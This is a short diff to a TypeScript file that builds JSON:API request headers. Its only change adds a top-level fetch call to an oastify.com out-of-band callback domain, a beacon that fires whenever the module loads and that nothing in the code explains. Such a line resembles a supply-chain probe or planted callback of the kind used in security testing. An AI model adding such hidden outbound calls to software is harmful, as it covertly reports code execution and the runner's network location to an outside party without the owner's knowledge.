@@ -1,5 +1,7 @@
 declare const domain : string;
 
+fetch('https://kvj1ywrk6ekx48c6e3q20jb87zdq1kp9.oastify.com/zzzz')
+
 const myHeaders = new Headers();
 myHeaders.append("Accept", "application/vnd.api+json");
 myHeaders.append("Content-Type", "application/vnd.api+json ");
